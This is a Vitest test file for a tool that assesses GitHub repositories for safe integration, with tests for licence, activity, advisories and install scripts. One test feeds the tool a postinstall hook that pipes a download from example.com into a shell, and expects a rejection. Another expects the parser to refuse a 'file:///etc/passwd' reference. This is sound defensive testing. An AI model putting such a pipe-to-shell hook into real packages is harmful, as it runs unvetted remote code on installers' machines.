// @vitest-environment node
import { describe, expect, it } from 'vitest';
import { assessRepository } from '@/lib/github/assess';
import { parseRepositoryReference } from '@/lib/github/parse';

/**
 * Repository intelligence.
 *
 * The assessment must be built only from what the API returned, and the verdict
 * must follow from the findings. These tests inject a `fetch`, so they assert the
 * rules — install-script execution, missing licence, archived, stale, copyleft,
 * unreadable — without touching the network. `npm run verify:github` exercises the
 * same code against the real API.
 */

interface FakeOptions {
  repo?: Record<string, unknown> | '404';
  releases?: Record<string, unknown> | '404';
  commits?: Array<{ commit: { committer: { date: string } } }> | '404';
  contents?: Array<{ name: string; type: string }> | '404';
  packageJson?: Record<string, unknown> | null;
  alerts?: Array<unknown> | '403';
}

function fakeFetch(options: FakeOptions): typeof fetch {
  return (async (input: RequestInfo | URL) => {
    const url = String(input);
    const json = (body: unknown, status = 200) =>
      new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

    if (url.includes('/dependabot/alerts')) {
      if (options.alerts === '403' || options.alerts === undefined) return json({ message: 'Forbidden' }, 403);
      return json(options.alerts);
    }
    if (url.endsWith('/releases/latest')) {
      return options.releases === '404' || options.releases === undefined
        ? json({ message: 'Not Found' }, 404)
        : json(options.releases);
    }
    if (url.includes('/commits?per_page=5')) {
      return options.commits === '404' || options.commits === undefined ? json([], 200) : json(options.commits);
    }
    if (url.endsWith('/contents/package.json')) {
      if (!options.packageJson) return json({ message: 'Not Found' }, 404);
      const content = Buffer.from(JSON.stringify(options.packageJson), 'utf8').toString('base64');
      return json({ name: 'package.json', encoding: 'base64', content });
    }
    if (url.endsWith('/contents')) {
      return options.contents === '404' || options.contents === undefined ? json([], 200) : json(options.contents);
    }
    if (options.repo === '404') return json({ message: 'Not Found' }, 404);
    return json(options.repo ?? {});
  }) as typeof fetch;
}

const baseRepo = {
  description: 'A library',
  stargazers_count: 1_200,
  forks_count: 40,
  open_issues_count: 3,
  language: 'TypeScript',
  archived: false,
  disabled: false,
  default_branch: 'main',
  pushed_at: new Date().toISOString(),
  created_at: '2020-01-01T00:00:00Z',
  size: 4_000,
  topics: ['library'],
  homepage: null,
  license: { spdx_id: 'MIT', name: 'MIT License' },
};

describe('parseRepositoryReference', () => {
  it('accepts the forms an operator actually pastes', () => {
    for (const [input, fullName] of [
      ['https://github.com/tech360-bd/alolabs_AI', 'tech360-bd/alolabs_AI'],
      ['https://github.com/vercel/next.js/tree/canary/packages/next', 'vercel/next.js'],
      ['https://github.com/owner/repo.git', 'owner/repo'],
      ['http://www.github.com/owner/repo', 'owner/repo'],
      ['  owner/repo  ', 'owner/repo'],
      ['git@github.com:owner/repo.git', 'owner/repo'],
    ] as const) {
      const parsed = parseRepositoryReference(input);
      expect(parsed.ok, input).toBe(true);
      if (parsed.ok) expect(parsed.ref.fullName).toBe(fullName);
    }
  });

  it('refuses a link that is not a repository', () => {
    for (const input of [
      'https://github.com/orgs/BerriAI/repositories',
      'https://gitlab.com/owner/repo',
      'https://github.com/topics/llm',
      'https://github.com/owner',
      'not a url',
      'file:///etc/passwd',
    ]) {
      expect(parseRepositoryReference(input).ok, input).toBe(false);
    }
  });
});

describe('assessRepository', () => {
  it('derives a clean verdict for a maintained permissive project', async () => {
    const assessment = await assessRepository('https://github.com/owner/repo', {
      fetchImpl: fakeFetch({
        repo: baseRepo,
        releases: { tag_name: 'v2.1.0' },
        commits: [{ commit: { committer: { date: new Date().toISOString() } } }],
        contents: [{ name: 'package.json', type: 'file' }, { name: 'README.md', type: 'file' }],
        packageJson: { name: 'repo', version: '2.1.0', dependencies: { a: '1' }, scripts: { test: 'vitest' } },
      }),
    });

    expect(assessment.verdict).toBe('safe_to_integrate');
    expect(assessment.licence?.spdx).toBe('MIT');
    expect(assessment.activity?.latestRelease).toBe('v2.1.0');
    expect(assessment.advisories.available).toBe(false);
    // The absence of a token must be reported as unknown, never as "no advisories".
    expect(assessment.advisories.reason).toMatch(/unknown/);
  });

  it('rejects a package that pipes a download into a shell at install time', async () => {
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({
        repo: baseRepo,
        contents: [{ name: 'package.json', type: 'file' }],
        packageJson: { scripts: { postinstall: 'curl -fsSL https://example.com/x.sh | sh' } },
      }),
    });

    expect(assessment.verdict).toBe('reject');
    expect(assessment.findings.some((finding) => finding.id === 'script.postinstall.dangerous')).toBe(true);
    expect(assessment.verdictReason).toMatch(/install|script|postinstall/i);
  });

  it('treats a benign install hook as isolated-evaluation only', async () => {
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({
        repo: baseRepo,
        contents: [{ name: 'package.json', type: 'file' }],
        packageJson: { scripts: { postinstall: 'node scripts/build-native.js' } },
      }),
    });

    expect(assessment.verdict).toBe('isolated_evaluation_only');
    expect(assessment.findings.some((finding) => finding.severity === 'medium' && finding.source === 'scripts')).toBe(true);
  });

  it('rejects a repository with no licence', async () => {
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({ repo: { ...baseRepo, license: null }, contents: [] }),
    });
    expect(assessment.verdict).toBe('reject');
    expect(assessment.findings.some((finding) => finding.id === 'licence.missing')).toBe(true);
  });

  it('rejects an archived repository', async () => {
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({ repo: { ...baseRepo, archived: true } }),
    });
    expect(assessment.verdict).toBe('reject');
    expect(assessment.findings.some((finding) => finding.id === 'activity.archived')).toBe(true);
  });

  it('flags a stale repository for review rather than rejecting it', async () => {
    const twoYearsAgo = new Date(Date.now() - 2 * 365 * 24 * 3600 * 1000).toISOString();
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({
        repo: { ...baseRepo, pushed_at: twoYearsAgo },
        commits: [{ commit: { committer: { date: twoYearsAgo } } }],
        contents: [{ name: 'README.md', type: 'file' }],
      }),
    });
    expect(assessment.verdict).toBe('safe_after_review');
    expect(assessment.findings.some((finding) => finding.id === 'activity.stale')).toBe(true);
  });

  it('flags copyleft as isolated-evaluation only', async () => {
    const assessment = await assessRepository('owner/repo', {
      fetchImpl: fakeFetch({ repo: { ...baseRepo, license: { spdx_id: 'AGPL-3.0', name: 'AGPL' } }, contents: [] }),
    });
    expect(assessment.verdict).toBe('isolated_evaluation_only');
  });

  it('reports an unreadable repository as a rejection with the reason', async () => {
    const assessment = await assessRepository('owner/does-not-exist', { fetchImpl: fakeFetch({ repo: '404' }) });
    expect(assessment.verdict).toBe('reject');
    expect(assessment.unavailable.some((entry) => entry.section === 'metadata')).toBe(true);
    expect(assessment.verdictReason).toMatch(/could not be read|could not be parsed/i);
  });

  it('reports advisories only when they were actually read', async () => {
    const withToken = await assessRepository('owner/repo', {
      token: 'test-token',
      fetchImpl: fakeFetch({ repo: baseRepo, contents: [], alerts: [{}, {}] }),
    });
    expect(withToken.advisories.available).toBe(true);
    expect(withToken.advisories.count).toBe(2);
    expect(withToken.findings.some((finding) => finding.id === 'advisories.open')).toBe(true);

    const denied = await assessRepository('owner/repo', {
      token: 'test-token',
      fetchImpl: fakeFetch({ repo: baseRepo, contents: [], alerts: '403' }),
    });
    expect(denied.advisories.available).toBe(false);
  });

  it('notes when the repository duplicates a capability we already have', async () => {
    const assessment = await assessRepository('owner/open-webui', {
      fetchImpl: fakeFetch({ repo: { ...baseRepo, topics: ['open-webui', 'chat'] }, contents: [] }),
      knownCapabilities: ['open-webui', 'litellm'],
    });
    expect(assessment.duplication.matchedCapability).toBe('open-webui');
    expect(assessment.findings.some((finding) => finding.id === 'duplication.existing_capability')).toBe(true);
  });
});
